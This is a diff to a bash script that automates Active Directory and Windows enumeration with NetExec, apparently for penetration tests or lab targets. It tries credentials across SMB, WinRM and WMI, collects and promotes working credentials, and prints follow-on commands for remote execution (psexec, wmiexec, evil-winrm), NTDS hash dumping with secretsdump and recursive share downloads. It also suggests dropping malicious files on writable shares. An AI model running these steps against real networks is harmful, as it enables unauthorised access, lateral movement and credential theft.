@@ -226,6 +226,551 @@ check_dependencies() {
     fi
 }
 
+# Function to check for nxc database schema issues and auto-fix
+check_nxc_db() {
+    if command -v nxc &> /dev/null; then
+        # Run a quick check against localhost to trigger potential DB errors
+        check_out=$(nxc smb 127.0.0.1 --timeout 1 2>&1)
+        if echo "$check_out" | grep -q "Schema mismatch detected"; then
+             log_warning "NXC DB Schema mismatch detected during self-check. Auto-fixing..."
+             # Try deleting DBs for both current user and root (if running as root)
+             rm -f ~/.nxc/workspaces/default/*.db 2>/dev/null
+             rm -f /root/.nxc/workspaces/default/*.db 2>/dev/null
+             log_success "Database files removed. NetExec will re-initialize them on the next run."
+        fi
+    fi
+}
+
+# Function to promote a working credential to the primary user
+promote_verified_creds() {
+    if [ -s "$VALID_CREDS_FILE" ] && { [ -f "$user" ] || [ -z "$user" ] || [ "$HAS_PROMOTED" != "true" ]; }; then
+        # Pick the first one (usually the one nxc found first)
+        local best_cred=$(head -n 1 "$VALID_CREDS_FILE")
+        local disc_domain=""
+        local remainder=""
+        local disc_user=""
+        local disc_secret=""
+        
+        if [[ "$best_cred" == *"\\"* ]]; then
+            disc_domain=$(echo "$best_cred" | cut -d'\' -f1)
+            remainder=$(echo "$best_cred" | cut -d'\' -f2-)
+        else
+            remainder="$best_cred"
+        fi
+        
+        disc_user=$(echo "$remainder" | cut -d: -f1)
+        disc_secret=$(echo "$remainder" | cut -d: -f2-)
+        
+        # Don't promote if it's the same as what we already have (unless we had a file)
+        [ "$user" == "$disc_user" ] && [ ! -f "$user" ] && return
+        
+        log_success "Found valid credentials: ${BWHITE}$best_cred${NC}"
+        log_info "Promoting '${BWHITE}$disc_user${NC}' as primary user for deep-dive enumeration..."
+        
+        # Update globals
+        [ -n "$disc_domain" ] && domain="$disc_domain"
+        user="$disc_user"
+        
+        # Determine if hash or password
+        if [[ "$disc_secret" =~ ^[0-9a-fA-F]{32}$ ]] || [[ "$disc_secret" =~ ^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$ ]]; then
+            hash="$disc_secret"
+            pass=""
+        else
+            pass="$disc_secret"
+            hash=""
+        fi
+        
+        # Re-build flags
+        if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi
+        if [ -n "$hash" ]; then
+            USER_FLAG="-u $user -H $hash"
+            RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
+            SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
+            RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
+        elif [ -n "$pass" ]; then
+            USER_FLAG="-u $user -p $pass"
+            RPC_ARG="-U $domain\\\\$user%$pass"
+            SECRETS_ARG="$domain/$user:$pass@$IP"
+            RPCDUMP_ARG="-u $user -p $pass -d $domain"
+        fi
+        
+        HAS_PROMOTED="true"
+        log_info "Flags updated. Subsequent checks will use '${BWHITE}$user${NC}' credentials."
+    fi
+}
+
+# Helper function to run nxc and suggest login command if successful
+check_and_suggest() {
+    service=$1
+    shift
+    log_info "Checking $service..."
+    # Print the command before execution
+    print_cmd "$@"
+    # Run the command and capture output
+    output=$("$@")
+
+    echo "$output"
+    
+    # Auto-fix Schema Mismatch and Retry
+    if echo "$output" | grep -q "Schema mismatch detected"; then
+        log_warning "Schema mismatch detected! Attempting auto-fix (deleting old DBs) and RETRYING..."
+        rm -f ~/.nxc/workspaces/default/*.db 2>/dev/null
+        rm -f /root/.nxc/workspaces/default/*.db 2>/dev/null
+        
+        log_info "Retrying command..."
+        # Retry the command
+        print_cmd "$@"
+        output=$("$@")
+        echo "$output"
+    fi
+
+    # Try different auth combinations if failed for SMB/WinRM/WMI
+    if [[ "$service" == "smb" || "$service" == "winrm" || "$service" == "wmi" ]] && ! echo "$output" | grep -q "+"; then
+         
+         # Helper to strip domain for retries
+         local base_args=()
+         local skip_next=false
+         for arg in "$@"; do
+             if [ "$skip_next" = true ]; then skip_next=false; continue; fi
+             if [ "$arg" = "-d" ]; then skip_next=true; continue; fi
+             base_args+=("$arg")
+         done
+
+         # 1. Try WITHOUT domain flag if one was provided
+         if [[ "$*" == *"-d "* ]]; then
+             log_warning "Auth failed with domain. Retrying WITHOUT domain flag..."
+             print_cmd "${base_args[@]}"
+             output=$("${base_args[@]}")
+             echo "$output"
+         fi
+
+         # 2. Try with --local-auth if still failed
+         if ! echo "$output" | grep -q "+"; then
+             log_warning "Still failed. Retrying with --local-auth (stripping domain)..."
+             print_cmd "${base_args[@]} --local-auth"
+             output=$("${base_args[@]}" --local-auth)
+             echo "$output"
+             
+             # If local auth worked, we should remember to use it for future suggestions in this session
+             if echo "$output" | grep -q "+"; then
+                 USE_LOCAL_AUTH="true"
+             fi
+         fi
+    fi
+    
+    # Harvest any successes found in this tool's output
+    echo "$output" | grep -a "\[+\]" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
+        local cred=$(echo "$line" | sed 's/.*\[+\] //')
+        if [ -n "$cred" ]; then
+            if ! grep -qxF "$cred" "$VALID_CREDS_FILE" 2>/dev/null; then
+                echo "$cred" >> "$VALID_CREDS_FILE"
+            fi
+        fi
+    done
+
+    # Harvest password change required
+    echo "$output" | grep -a "STATUS_PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | sed 's/\x1b\[[0-9;]*m//g' | while read -r line; do
+        local cred=$(echo "$line" | sed 's/.*[-] //' | cut -d' ' -f1)
+        if [ -n "$cred" ]; then
+            if ! grep -qxF "$cred" "$POTENTIAL_CREDS_FILE" 2>/dev/null; then
+                echo "$cred (PASSWORD_MUST_CHANGE)" >> "$POTENTIAL_CREDS_FILE"
+            fi
+        fi
+    done
+    
+    # Check for success indicator "[+]"
+    if echo "$output" | grep -q "+"; then
+        # If user is a file (list), sanitizing to just 'USER' for display purposes in suggestions
+        # The true username will be available if auto-promotion runs, but here we just want a clean string
+        display_user="$user"
+        if [ -f "$user" ]; then
+             display_user="USER"
+        fi
+
+        log_success "Valid credentials for $service! Suggested command:"
+
+        
+        # Prepare credential strings
+        if [ -n "$domain" ] && [ "$USE_LOCAL_AUTH" != "true" ]; then
+             display_user_winrm="$domain\\$display_user"
+        else
+             display_user_winrm="$display_user"
+        fi
+
+        if [ -n "$hash" ]; then
+            IMPACKET_CREDS="$domain/$display_user@$IP -hashes :$hash"
+            WINRM_CREDS="-i $IP -u '$display_user_winrm' -H '$hash'"
+            if [ -n "$domain" ]; then
+                SMBCLIENT_AUTH="-U '$domain\\$display_user' --pw-nt-hash $hash"
+                SMBGET_USER="$domain/$display_user%$hash"
+                SMBMAP_CREDS="-u '$display_user' -p '$hash' -d '$domain'"
+            else
+                SMBCLIENT_AUTH="-U '$display_user' --pw-nt-hash $hash"
+                SMBGET_USER="$display_user%$hash"
+                SMBMAP_CREDS="-u '$display_user' -p '$hash'"
+            fi
+            XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
+        else
+            IMPACKET_CREDS="$domain/$display_user:$pass@$IP"
+            WINRM_CREDS="-i $IP -u '$display_user_winrm' -p '$pass'"
+            if [ -n "$domain" ]; then
+                SMBCLIENT_AUTH="-U '$domain\\$display_user%$pass'"
+                SMBGET_USER="$domain/$display_user%$pass"
+                SMBMAP_CREDS="-u '$display_user' -p '$pass' -d '$domain'"
+            else
+                SMBCLIENT_AUTH="-U '$display_user%$pass'"
+                SMBGET_USER="$display_user%$pass"
+                SMBMAP_CREDS="-u '$display_user' -p '$pass'"
+            fi
+            XFREERDP_PASS="/p:'$pass'"  # For xfreerdp3 with password
+        fi
+
+        case $service in
+            "smb")
+                # Suggest Impacket tools for SMB
+                log_warning "Impacket tools for SMB:"
+                echo "impacket-psexec $IMPACKET_CREDS"
+                echo "impacket-smbexec $IMPACKET_CREDS"
+                
+                # Check for Admin access (Pwn3d!)
+                if echo "$output" | grep -q "Pwn3d!"; then
+                     log_success "Admin access (Pwn3d!) detected - tools above will work!"
+                else
+                     log_error "Note: Admin tools above require elevated privileges"
+                fi
+                echo ""
+
+                # Enumerate shares to see which ones are accessible
+                log_info "Enumerating shares for suggestions..."
+                # Use the already captured output if it contains shares, or run it if needed.
+                # Since we are optimizing to run --shares in the main call, we use $output.
+                shares_output="$output"
+                
+                # Check for writable shares and display prominent notice
+                writable_shares=$(echo "$shares_output" | sed 's/\x1b\[[0-9;]*m//g' | grep "WRITE" | awk '{for(i=1;i<=NF;i++) if($i ~ /WRITE/) {print $(i-1); next}}' | sed 's/^\\\//')
+                if [ -n "$writable_shares" ]; then
+                    log_error "WRITABLE SHARES FOUND - Potential for privilege escalation!"
+                    log_warning "Writable shares for user '${display_user}':"
+                    echo "$shares_output" | while read -r line; do
+                        clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+                        if [[ "$clean_line" == *"WRITE"* ]]; then
+                            share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ,WRITE|WRITE)$/) {print $(i-1); exit}}')
+                            share=${share#\\}
+                            if [ ! -z "$share" ]; then
+                                echo -e "  - ${BRED}$share${NC}"
+                                log_info "Upload file to $share:"
+                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'put local_file.txt remote_file.txt'"
+                            fi
+                        fi
+                    done
+                    echo ""
+                    log_success "Exploitation suggestions:"
+                    echo "# Upload malicious files, DLL hijacking, or SCF/LNK attacks"
+                    echo "# Check for startup folders, scripts, or scheduled tasks"
+                    echo ""
+                fi
+                
+                log_success "Suggested connections:"
+                echo "$shares_output" | while read -r line; do
+                    # Clean color codes for parsing
+                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+                    
+                    # Check for accessible shares (READ or WRITE)
+                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
+                        # Extract share name (it is the field before READ or WRITE)
+                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
+                        
+                        # Remove leading backslash if present
+                        share=${share#\\}
+                        
+                        if [ ! -z "$share" ]; then
+                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share"
+                        fi
+                    fi
+                done
+                
+                # Add recursive download suggestions
+                echo ""
+                log_success "Download all files from shares:"
+                echo "$shares_output" | while read -r line; do
+                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
+                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i ~ /^(READ|WRITE|READ,WRITE)$/) {print $(i-1); exit}}')
+                        share=${share#\\}
+                        if [ ! -z "$share" ]; then
+                            log_info "Download $share recursively:"
+                            if [ -n "$hash" ]; then
+                                echo "# Recursively download all files (Best way):"
+                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
+                                echo ""
+                                echo "# Download specific file with smbmap:"
+                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
+                                echo "# Note: smbget doesn't support --pw-nt-hash"
+                            else
+                                echo "# Recursively download all files (Best ways):"
+                                echo "smbget -R smb://$IP/$share -U '$SMBGET_USER'"
+                                echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
+                                echo ""
+                                echo "# Download specific file with smbmap:"
+                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
+                            fi
+                            echo ""
+                        fi
+                    fi
+                done
+                
+                # Add remote execution tool suggestions
+                log_success "Remote execution tools:"
+                if echo "$output" | grep -q "Pwn3d!"; then
+                    log_info "Admin access detected - these tools should work:"
+                    echo "wmiexec.py $IMPACKET_CREDS"
+                    echo "psexec.py $IMPACKET_CREDS"
+                    echo "smbexec.py $IMPACKET_CREDS"
+                    echo "atexec.py $IMPACKET_CREDS"
+                else
+                    log_warning "No admin access - these tools may fail:"
+                    echo "wmiexec.py $IMPACKET_CREDS  # Requires admin"
+                    echo "psexec.py $IMPACKET_CREDS   # Requires admin"
+                fi
+                ;;
+            "wmi")
+                if echo "$output" | grep -q "Pwn3d!"; then
+                     log_success "Admin access (Pwn3d!) detected - impacket-wmiexec should work!"
+                else
+                     log_warning "Valid credentials, but Admin access not detected. impacket-wmiexec might fail (Access Denied)."
+                fi
+                echo "impacket-wmiexec $IMPACKET_CREDS"
+                ;;
+            "winrm")
+                log_success "WinRM Shell access! Suggested shell tool:"
+                echo "evil-winrm $WINRM_CREDS"
+                if [ "$USE_LOCAL_AUTH" = "true" ]; then
+                     log_info "Note: Successful login was found to be a local account."
+                fi
+                echo ""
+                log_info "Or execute command with NetExec:"
+                if [ "$USE_LOCAL_AUTH" = "true" ]; then
+                     echo "nxc winrm $IP $USER_FLAG --local-auth -x whoami"
+                else
+                     echo "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami"
+                fi
+                ;;
+            "mssql")
+                echo "impacket-mssqlclient $IMPACKET_CREDS"
+                ;;
+            "ssh")
+                echo "ssh '$display_user@$IP'"
+                ;;
+            "ftp")
+                echo "ftp ftp://$display_user:$pass@$IP"
+                ;;
+            "vnc")
+                echo "vncviewer $IP"
+                ;;
+            "ldap")
+                # LDAP enumeration tools
+                log_section "LDAP Enumeration Tools"
+                
+                # Check for Admin access (Pwn3d!)
+                if echo "$output" | grep -q "Pwn3d!"; then
+                    log_error "Domain Admin access (Pwn3d!) detected! You can dump NTDS hashes."
+                    log_success "Suggested exploitation commands:"
+                    echo "nxc smb $IP $USER_FLAG --ntds"
+                    echo "impacket-secretsdump $IMPACKET_CREDS"
+                    echo ""
+                fi
+
+                if [ -n "$domain" ]; then
+                    base_dn="DC=${domain//./,DC=}"
+                    if [ -n "$hash" ]; then
+                        log_info "NetExec LDAP enumeration:"
+                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --users"
+                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -H '$hash' --bloodhound -c All"
+                        echo ""
+                        log_info "ldapdomaindump (requires password, not hash):"
+                        echo "# ldapdomaindump -u '$domain\\$display_user' -p 'PASSWORD' ldap://$IP"
+                    else
+                        log_info "ldapsearch:"
+                        echo "ldapsearch -x -H ldap://$IP -D \"$display_user@$domain\" -w '$pass' -b \"$base_dn\" \"(objectClass=*)\""
+                        echo ""
+                        log_info "ldapdomaindump:"
+                        echo "ldapdomaindump -u '$domain\\$display_user' -p '$pass' ldap://$IP"
+                        echo ""
+                        log_info "BloodHound data collection:"
+                        echo "bloodhound-python -u '$display_user' -p '$pass' -d $domain -ns $IP -c All"
+                        echo ""
+                        log_info "NetExec LDAP enumeration:"
+                        echo "nxc ldap $IP $DOMAIN_FLAG -u '$display_user' -p '$pass' --users --bloodhound -c All"
+                    fi
+                else
+                    log_warning "Domain name required for LDAP tools. Specify with -d flag"
+                fi
+                ;;
+        esac
+        
+        # RDP specific
+        if [ "$service" == "rdp" ]; then
+            if [ -n "$domain" ]; then
+                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /d:'$domain' /dynamic-resolution +clipboard /cert:ignore"
+                 echo "rdesktop -u '$display_user' -p '$pass' -d '$domain' $IP"
+            else
+                 echo "xfreerdp3 /v:$IP /u:'$display_user' $XFREERDP_PASS /dynamic-resolution +clipboard /cert:ignore"
+                 echo "rdesktop -u '$display_user' -p '$pass' $IP"
+            fi
+            echo "remmina -c rdp://$display_user:$pass@$IP"
+        fi
+        echo ""
+    fi
+}
+
+
+# Function to auto-detect the target OS and Domain info
+detect_target_info() {
+    log_info "Attempting to auto-detect target OS and Domain for $IP..."
+    
+    # Priority 1: SMB (Port 445) - Very reliable for Windows/AD
+    if check_port $IP 445; then
+        # Try to get OS info from nxc smb
+        log_info "SMB port 445 is open. Checking info with NetExec..."
+        smb_out=$(nxc smb $IP --timeout 5 2>&1)
+        
+        # Extract OS type
+        if echo "$smb_out" | grep -qi "windows"; then
+            os_type="windows"
+            log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via NetExec SMB)"
+        elif echo "$smb_out" | grep -qi "linux\|samba"; then
+            os_type="linux"
+            log_success "Auto-detected OS: ${BWHITE}Linux/Samba${NC} (via NetExec SMB)"
+        else
+            os_type="windows"
+            log_info "SMB port 445 open, assuming ${BWHITE}Windows${NC}."
+        fi
+
+        # Extract Domain if not already provided
+        if [ -z "$domain" ]; then
+            discovered_domain=$(echo "$smb_out" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
+            discovered_name=$(echo "$smb_out" | grep -oP '(?<=name:)[^\)]+' | head -n1 | tr -d ' ')
+            
+            if [ -n "$discovered_domain" ] && [ "$discovered_domain" != "$IP" ]; then
+                domain="$discovered_domain"
+                log_success "Auto-discovered domain: ${BWHITE}$domain${NC}"
+                
+                # Check if FQDN or just domain
+                full_host=""
+                if [ -n "$discovered_name" ]; then
+                    full_host="$discovered_name.$domain"
+                fi
+
+                # Prompt to add to /etc/hosts
+                hosts_entry="$IP $domain"
+                [ -n "$full_host" ] && hosts_entry="$IP $full_host $domain"
+                
+                if ! grep -q "$domain" /etc/hosts 2>/dev/null; then
+                    echo -e "\n${BYELLOW}❓ Do you want to add '${BWHITE}$hosts_entry${NC}${BYELLOW}' to /etc/hosts?${NC}"
+                    echo -e "${BCYAN}   (Recommended for better Kerberos/DNS resolution)${NC}"
+                    read -p "   [y/N]: " choice
+                    case "$choice" in 
+                        y|Y ) 
+                            echo "$hosts_entry" | sudo tee -a /etc/hosts >/dev/null
+                            log_success "Added to /etc/hosts"
+                            ;;
+                        * ) log_info "Skipping /etc/hosts update";;
+                    esac
+                else
+                    log_info "Domain already exists in /etc/hosts"
+                fi
+            fi
+        fi
+        return 0
+    fi
+
+    # Priority 2: RDP (Port 3389) - Almost always Windows
+    if check_port $IP 3389; then
+        os_type="windows"
+        log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via RDP)"
+        return 0
+    fi
+
+    # Priority 3: SSH (Port 22) - Usually Linux
+    if check_port $IP 22; then
+        os_type="linux"
+        log_success "Auto-detected OS: ${BWHITE}Linux${NC} (via SSH)"
+        return 0
+    fi
+    
+    # Priority 4: WinRM (Ports 5985, 5986) - Windows
+    if check_port $IP 5985 || check_port $IP 5986; then
+        os_type="windows"
+        log_success "Auto-detected OS: ${BWHITE}Windows${NC} (via WinRM)"
+        return 0
+    fi
+
+    # Fallback
+    os_type="windows"
+    log_warning "Could not reliably detect OS. Defaulting to ${BWHITE}Windows${NC}."
+}
+
+# Function to check if all needed tools are installed
+check_dependencies() {
+    log_section "Checking Dependencies"
+    
+    local missing_tools=()
+    local install_cmds=()
+    
+    # Define tools and their installation commands for Kali
+    declare -A tools
+    tools["nxc"]="sudo apt update && sudo apt install netexec -y"
+    tools["impacket-lookupsid"]="sudo apt update && sudo apt install python3-impacket -y"
+    tools["rpcclient"]="sudo apt update && sudo apt install smbclient -y"
+    tools["ldapsearch"]="sudo apt update && sudo apt install ldap-utils -y"
+    tools["showmount"]="sudo apt update && sudo apt install nfs-common -y"
+    tools["enum4linux"]="sudo apt update && sudo apt install enum4linux -y"
+    tools["ldapdomaindump"]="sudo apt update && sudo apt install ldapdomaindump -y"
+    tools["smbmap"]="sudo apt update && sudo apt install smbmap -y"
+    tools["certipy"]="pipx install certipy-ad"
+    tools["unbuffer"]="sudo apt update && sudo apt install expect -y"
+    
+    # Check for each tool
+    for tool in "${!tools[@]}"; do
+        if ! command -v "$tool" &> /dev/null; then
+            # Special check for impacket tools which might be named tool.py
+            if [[ "$tool" == impacket-* ]]; then
+                local alt_tool="${tool#impacket-}.py"
+                if command -v "$alt_tool" &> /dev/null; then
+                    continue
+                fi
+            fi
+            
+            missing_tools+=("$tool")
+            install_cmds+=("${tools[$tool]}")
+        fi
+    done
+    
+    # If tools are missing, inform the user
+    if [ ${#missing_tools[@]} -gt 0 ]; then
+        log_warning "The following tools are missing:"
+        for i in "${!missing_tools[@]}"; do
+            echo -e "  - ${BRED}${missing_tools[$i]}${NC}"
+        done
+        
+        echo ""
+        log_info "To install them on Kali Linux, run:"
+        # Unique install commands
+        printf "%s\n" "${install_cmds[@]}" | sort -u | while read -r cmd; do
+            echo -e "  ${BMAGENTA}$cmd${NC}"
+        done
+        echo ""
+        
+        read -p "⚠️  Some enumeration modules will fail. Do you want to continue anyway? (y/N): " choice
+        case "$choice" in 
+          y|Y ) log_info "Continuing without missing tools...";;
+          * ) log_error "Exiting. Please install missing dependencies."; exit 1;;
+        esac
+    else
+        log_success "All essential tools are installed!"
+    fi
+}
+
 # Banner
 print_banner() {
     echo -e "${BCYAN}${BOLD}"
@@ -556,8 +1101,9 @@ if [ "$os_type" = "windows" ]; then
 
     # LDAP domain SID (requires credentials)
     if [ -n "$user" ]; then
-        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --users"
-        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
+        log_info "Fetching Domain SID..."
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid"
+        unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --get-sid | tee nxc-enum/ldap/domain-sid.txt
     else
         log_info "Skipping LDAP domain SID (no credentials supplied)"
     fi
